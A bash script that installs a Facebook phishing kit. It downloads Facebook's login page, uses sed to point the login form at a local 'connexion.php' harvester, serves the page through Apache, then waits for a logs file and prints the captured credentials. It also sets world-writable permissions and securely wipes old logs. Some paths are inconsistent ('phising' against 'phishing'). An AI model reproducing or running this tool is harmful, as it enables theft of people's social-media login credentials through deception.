#!/bin/bash
framework=$(ls /var/www/facebook_phising)

if [ $framework != /var/www/facebook_phising ]; then
echo "[+] Framework Installation ..."
sleep 1
mkdir /var/www/facebook_phising
chmod 777 /var/www/facebook_phishing
echo ""
echo "[+] Creating malicious code ..."
sleep 1
cp connexion.php /var/www/facebook_phishing/
echo ""
echo "[+] Copying Facebook login page ..."
sleep 1
wget -U firefox https://facebook.com/login.php -O /var/www/facebook_phishing/login.php
echo "[+] Infecting the login page ..."
sleep 1
cd /var/www/facebook_phishing && sed -i -e "s#/login.php?login_attempt=1#connexion.php#g" login.php
echo ""
echo "[+] Login page infected !"
sleep 1
echo ""
echo "[+] starting Apache service ..."
sleep 1
service apache2 start
clear
echo ""
echo "[*] Phising Framework installation under ==> /var/www/facebook_phishing/"
echo ""
echo "[*] Phising URL ==> http://localhost/facebook_phishing/login.php"
sleep 5
fi

clear
echo "[+] Installation detected !"
wipe -s -f /var/www/facebook_phishing/logs.txt
sleep 1
echo "[+] Press Enter to start the sniffer indentifiants ..."
read user
clear

presence=""

while test "$presence" != /var/www/facebook_phishing/logs.txt

do

presence=$(ls /var/www/facebook_phishing/logs.txt)
clear
echo "[*] listening for connections ..."
sleep 2

done

if [ $presence == "/var/www/facebook_phishing/logs.txt" ]; then
	
	clear
	echo "[+] Login intercepted !"
	sleep 1
	echo ""
	cat /var/www/facebook_phishing/logs.txt
	sleep 1
	echo ""
	echo "Press Enter to exit ..."
	read user
fi
